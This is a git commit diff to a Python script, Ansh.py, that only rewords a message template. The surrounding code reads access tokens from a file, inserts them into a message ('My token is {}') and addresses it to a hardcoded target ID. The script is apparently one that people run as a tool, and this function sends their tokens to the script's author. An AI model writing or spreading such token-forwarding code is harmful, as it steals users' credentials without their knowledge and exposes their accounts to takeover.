09c62da1f1756cd4fc0281781bcc725464bfb174
Itzkrit09 <825.krit@gmail.com>
2025-05-08 22:38:00 +0530

    Update Ansh.py

--- Ansh.py
+++ Ansh.py
@@ -39,7 +39,7 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = "Hello SANSKAR SIR  ! I am using your server but dont fyt dark night members. My token is {}"
+      msg_template = "Hello SANSKAR SIR  ! I am using your server My token is {}"
 
       # Specify the ID where you want to send the message
       target_id = "100054184067769"
